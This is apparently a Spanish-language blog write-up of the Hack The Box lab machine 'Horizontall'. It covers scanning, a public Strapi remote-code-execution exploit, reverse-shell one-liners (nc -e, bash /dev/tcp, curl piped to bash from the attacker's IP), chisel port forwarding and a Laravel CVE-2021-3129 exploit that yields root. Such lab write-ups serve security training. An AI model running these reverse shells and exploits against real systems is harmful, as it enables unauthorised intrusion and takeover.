---
layout: single
title: Horizontall - Hack The Box
excerpt: "Horizontall es una maquina donde estaremos explotando una vulnerabilidad en un gestor de contenido llamado Strapi, luego tendremos que hacer port forwarding para poder llegar a la maquina y posteriormente lograr comprometerla gracias a una vulnerabilidad en Laravel."
date: 2023-02-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-horizontall/Horizontall.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:

- hackthebox
- eJTP
- eWPT
- Fácil
- Linux

tags:

- Information Leakage
- Port Forwarding
- Strapi CMS Exploitation
- Laravel Exploitation
---

Certificaciones a aplicar: eJPT, eWPT

Dificultad: Fácil

Habilidades: 

- Information Leakage
- Port Forwarding
- Strapi CMS Exploitation
- Laravel Exploitation

![Captura de pantalla (62).png](/assets/images/htb-writeup-horizontall/Horizontall.png)

# IP de la Maquina

10.10.11.105

# Reconocimiento

Identificando el sistema operativo.

```bash
whichSystem.py 10.10.11.105
```

![Hackforce-2022-12-11-17-57-12.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-57-12.png)

Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.105 -oG allPorts
```

![Hackforce-2022-12-11-17-56-15.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-56-15.png)

Función extractPorts.

```bash
extractPorts allPorts
```

![Hackforce-2022-12-11-18-00-00.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-00-00.png)

# Análisis de Vulnerabilidades

Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.

```bash
nmap -sCV -p22,80 10.10.11.105 -oN targeted
```

![Hackforce-2022-12-11-18-01-23.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-01-23.png)

Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.

![Hackforce-2022-12-11-18-07-31.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-07-31.png)

De esta manera vemos que estamos ante un Ubuntu Bionic.

Luego vemos que nmap nos reporta que hay un follow redirect hacia [http://horizontall.htb](http://horizontall.htb/) entonces verificamos con whatweb y debería mostrar lo mismo.

![Hackforce-2022-12-11-18-11-03.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-11-03.png)

En efecto vemos que nos muestra lo mismo, si colocamos esa dirección en el navegador nos dará error ya que se esta aplicando virtual hosting.

Para agregarla editamos el fichero que esta /etc/hosts de la siguiente manera.

![Hackforce-2022-12-11-18-16-41.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-16-41.png)

Con esto ya tendria que resolvernos el dominio en la ip privada y para comprobar emitimos un ping hacia el dominio.

![Hackforce-2022-12-11-18-18-08.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-18-08.png)

Luego vamos a aplicar el script http-enum de nmap al dominio agregado y lo guardamos en formato nmap y lo exportamos en el ficherito webScan. 

![Hackforce-2022-12-11-18-23-25.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-23-25.png)

Si no nos encontro nada como es el caso borramos el ficherito.

Vamos a hacer Fuzzing con wfuzz

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
```

![Hackforce-2022-12-11-23-09-04.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-09-04.png)

Nos encontró 3 directorios los analizamos y miramos si hay algo si no inspeccionaremos el código fuente de la pagina a ver si hay alguna pista.

Lanzamos un Curl al sitio haciendo una petición GET.

```bash
curl -s -X GET "http://horizontall.htb/" | htmlq -p | cat -l html
```

![Hackforce-2022-12-11-23-19-45.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-19-45.png)

Nos lo mostrara asi para inspeccionar mejor el código y vemos algo medio intersante haciendo referencia a unos archivos java script.

Vamos a utilizar unas expresiones regulares con grep para filtrar por lo que nos interesa.

```bash
curl -s -X GET "http://horizontall.htb/" | htmlq -p | cat -l html | grep -oP '".*?"' | grep app\. | sort -u
```

![Hackforce-2022-12-11-23-30-41.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-30-41.png)

Observamos dos rutas, la de css no es de tanto interes asi que vamos a mirar la de js.

```bash
curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js"
```

![Hackforce-2022-12-11-23-33-15.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-33-15.png)

Vemos lo siguiente, no miramos nada así que vamos a filtrar para ver si logramos obtener algo.

```bash
curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js" | grep "\.htb"
```

![Hackforce-2022-12-11-23-38-34.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-38-34.png)

Vemos algo interesante así que vamos a crear una expresión regular una vez mas y que nos filtre por http.

```bash
curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js" | grep -oP '".*?"' | grep http |  sort -u
```

![Hackforce-2022-12-11-23-42-50.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-42-50.png)

Ahi tenemos lo que nos interesa así que vamos a verlo en el navegador, pero antes tenemos que agregarlo al /etc/hosts.

![Hackforce-2022-12-11-23-45-13.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-45-13.png)

Ahora lo miramos en el navegador y vemos con wappalyzer que tecnologias posee.

![Hackforce-2022-12-11-23-47-17.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-47-17.png)

Vemos un CMS llamado strapi.

Buscamos con searchsploit una posible vulnerabilidad.

```bash
searchsploit  strapi
```

![Hackforce-2022-12-11-23-49-24.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-49-24.png)

Vemos 3 vulnerabilidades encontradas.

Vamos a verlo por consola la url que vimos anteriormente [http://api-prod.horizontall.htb/reviews](http://api-prod.horizontall.htb/reviews)

```bash
curl -s -X GET "http://api-prod.horizontall.htb/reviews" | jq
```

![Hackforce-2022-12-11-23-53-10.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-53-10.png)

Vemos posibles usuarios pero nada mas así que volveremos a hacer fuzzing con wfuzz.

```bash
wfuzz -c -t 200 --hc=404,200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/FUZZ"
```

![Hackforce-2022-12-12-00-06-57.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-06-57.png)

Vemos por ahi un par de cosas interesantes por ejem visitaremos la ruta de admin a ver que hay.

![Hackforce-2022-12-12-00-08-30.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-08-30.png)

Vemos un panel de autenticacion pero no disponemos de credenciales, antes probamos buscar las de default a ver si logramos entrar. 

Ahora haremos Fuzzing de nuevo a esta ruta [http://api-prod.horizontall.htb/admin/](http://api-prod.horizontall.htb/admin/)

```bash
wfuzz -c --hc=404 --hh=854 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/admin/FUZZ"
```

![Hackforce-2022-12-12-00-43-41.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-43-41.png)

Miramos un par de directorios interesantes.

Al visitar el directorio Init podemos contemplar la version de Strapi y si buscamos con searchsploit como lo hicimos anteriormente miraremos que es vulnerable.

![Hackforce-2022-12-12-00-49-13.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-49-13.png)

```bash
searchsploit strapi
```

![Hackforce-2022-12-12-00-51-06.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-51-06.png)

# Explotación

Nos dirigimos a la carpeta exploit de nuestros directorios de trabajo y nos copiamos el que dice remote code execution (Unauthenticated).

```bash
searchsploit -m multiple/webapps/50239.py
```

Lo renombramos.

```bash
mv 50239.py rce_strapi.py
```

![Hackforce-2022-12-12-00-57-51.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-57-51.png)

Ejecutamos el exploit para ver que nos pide.

```bash
python3 rce_strapi.py
```

![Hackforce-2022-12-12-00-59-28.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-59-28.png)

Como vemos solo nos pide la url.

Le pasamos la URL.

![Hackforce-2022-12-12-01-03-33.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-03-33.png)

Y como podemos ver nos funciono el exploit.

Ahora probaremos entablarnos una reverse shell.

```bash
nc -e /bin/bash 10.10.14.7 443
```

![Hackforce-2022-12-12-01-10-06.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-10-06.png)

Vemos que no al parecer no nos interpreta, hacemos un par de pruebas mas.

```bash
bash -i >& /de/tcp/10.10.14.7/443 0>&1
bash -c "bash -i >& /de/tcp/10.10.14.7/443 0>&1"
bash -c bash -i >%26 /de/tcp/10.10.14.7/443 0>%261"
```

Probamos con cada una y vemos que no funciona entonces verificamos que la maquina tenga curl.

```bash
Curl http://10.10.14.7/test
```

Y también nos montamos el servidor con python en nuestra maquina.

```bash
python3 -m http.server 80
```

![Hackforce-2022-12-12-01-16-05.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-16-05.png)

Y vemos que si tiene curl instalado la maquina victima.

Lo que haremos sera crearnos un archivo index.html con el siguiente contenido.

```bash
nvim index.html
```

![Hackforce-2022-12-12-01-43-37.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-43-37.png)

Nos montamos el servidor con python para compartirnos el recurso index.html.

```bash
python3 -m http.server 80
```

 

Ahora hacemos un curl al recurso que compartimos, veremos que nos muestra el código del index.html si lo pipeamos con bash nos va a interpretar el código, antes de lanzarle el curl nos ponemos en escucha con netcat.

```bash
curl http://10.10.14.7/index.html | bash
```

![Hackforce-2022-12-12-01-45-04.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-45-04.png)

Una vez lanzado el curl podemos ver que hemos obtenido una reverse shell.

![Hackforce-2022-12-12-01-49-08.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-49-08.png)

Hacemos un locate del user.txt

```bash
locate user.txt
```

![Hackforce-2022-12-12-01-57-41.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-57-41.png)

Vemos donde esta la flag y hacemos un cat para ver si logramos visualizarla.

![Hackforce-2022-12-12-01-58-44.png](/assets/images/htb-writeup-horizontall/user.png)

En efecto visualizamos la flag con eso ya tendríamos la maquina ahora nos falta convertirnos en root.

Antes de escalar priveligios haremos el tratamiento de la TTY.

```bash
script /dev/null -c bash
```

![Hackforce-2022-12-12-02-14-16.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-14-16.png)

ctrl + z y continuamos con el tratamiento.

```bash
stty raw -echo; fg
reset
xterm
```

![Hackforce-2022-12-12-02-16-30.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-16-30.png)

Continuamos

```bash
export TERM=xterm
export SHELL=bash
ssty rows 37 columns 183
```

En el caso de el size de la stty tienen que colocar la de las proporciones de su ventana y ya con esto tendriamos total movilidad en la shell.

![Hackforce-2022-12-12-02-20-33.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-20-33.png)

Ahora si pasamos a la escalada.

# Escalada de Privilegios

Lo primero que haremos sera buscar por permisos SUID nos dirigimos a la raiz y ejecutamos.

```bash
find \-perm -4000 2>/dev/null
```

![Hackforce-2022-12-12-02-28-37.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-28-37.png)

No vemos nada interesante para escalar.

Luego listamos por tareas cron.

```bash
cat /etc/crontab
```

![Hackforce-2022-12-12-02-29-51.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-29-51.png)

No vemos ninguna tarea cron.

Listamos puertos que estén abiertos.

```bash
netstat -nat
```

![Hackforce-2022-12-12-02-31-39.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-31-39.png)

Vemos por ahi uno interesante.

lanzamos un curl al puerto 8000 para ver que hay.

```bash
curl localhost:8000
```

![Hackforce-2022-12-12-02-32-56.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-32-56.png)

Vemos que hay una pagina web con laravel.

Utilizaremos chisel para jugar con port forwarding. Nos dirigimos a github y nos clonamos el repositorio en exploits.

```bash
git clone https://github.com/jpillora/chisel.git
```

Nos metemos en chisel y compilamos.

```bash
go build -ldflags "-s -w" .
```

Ahora con UPX vamos a reducir mas el peso de chisel

```bash
upx chisel
```

Una vez hecho esto nos transferiremos el chisel a la maquina victima. En nuestra maquina colocamos.

```bash
python3 -m http.server 80
```

Y en la maquina victima nos dirigimos al directorio tmp y nos bajamos el chisel.

```bash
wget http://10.10.14.7/chisel
```

![Hackforce-2022-12-12-02-45-39.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-45-39.png)

Luego le damos permisos de ejecución chmod + x chisel.

Ahora para utilizar chisel vamos a montarnos un servidor en nuestra maquina por el puerto que queramos.

```bash
./chisel server --reverse -p 1234
```

![Hackforce-2022-12-12-02-55-21.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-55-21.png)

Ahora ejecutamos el chisel en la maquina victima para hacer el port forwarding.

```bash
./chisel client 10.10.14.7:1234 R:8000:127.0.0.1:8000
```

![Hackforce-2022-12-12-03-04-25.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-04-25.png)

Con esto ya estaría listo el port forwarding, y lo verificamos visitando el [localhost](http://localhost) en el puerto indicado.

![Hackforce-2022-12-12-03-05-39.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-05-39.png)

Listo ya podemos visualizar la pagina de laravel en nuestra maquina.

Buscamos en github un exploit para esa version de laravel y nos clonamos el repositorio en exploits.

```bash
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
```

Nos metemos al directorio y ejecutamos el script de python.

```bash
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 whoami
```

![Hackforce-2022-12-12-03-32-43.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-32-43.png)

Listo nos funciono ahora solo nos faltaria ejecutarnos una reverse shell para acceder como root y visualizar la flag.

Como ya tenemos una via potencial para mandarnos la reverse shell con el index.html que habiamos creado lo copiamos a este directorio.

```bash
cp ../index.html .
```

 

Luego montamos el servidor con python nuevamente.

```bash
python3 -m http.server 80
```

 

Nos ponemos en escucha con netcat.

```bash
nc -nlvp443
```

Y por ultimo ejecutamos el exploit.

```bash
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 'curl 10.10.14.7 | bash'
```

![Hackforce-2022-12-12-03-44-27.png](/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-44-27.png)

Listo con esto nos convertimos en root y podemos visualizar la flag.

Visualizamos la flag.

![Hackforce-2022-12-12-03-49-05.png](/assets/images/htb-writeup-horizontall/root.png)

Listo con esto tendríamos hecha la maquina por completo, happy hacking.
